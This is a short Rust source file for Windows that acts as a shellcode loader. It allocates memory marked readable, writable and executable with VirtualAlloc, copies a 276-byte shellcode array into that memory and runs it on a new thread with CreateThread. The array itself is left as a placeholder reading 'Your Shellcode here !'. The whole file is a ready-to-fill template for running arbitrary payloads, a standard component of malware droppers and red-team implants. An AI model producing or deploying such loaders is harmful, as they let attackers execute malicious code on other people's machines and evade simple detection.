use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
use winapi::um::errhandlingapi::{GetLastError};
use winapi::um::processthreadsapi::{CreateThread};
use winapi::um::synchapi::WaitForSingleObject;

use winapi::ctypes::{c_void};
use winapi::um::winnt::{PVOID};



fn main() {
    let mut threadID = 0;

    let shellcode: [u8; 276] = [/*Your Shellcode here !*/];


    unsafe {
        let memAlloc = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x00001000, 0x40);
        std::ptr::copy(shellcode.as_ptr() as *const u8, memAlloc as *mut u8, shellcode.len());

        let threadExec = CreateThread(std::ptr::null_mut(), 0, Some(std::mem::transmute(memAlloc)), std::ptr::null_mut(), 0, &mut threadID);
        WaitForSingleObject(threadExec, 0xFFFFFFFF);

    }

}
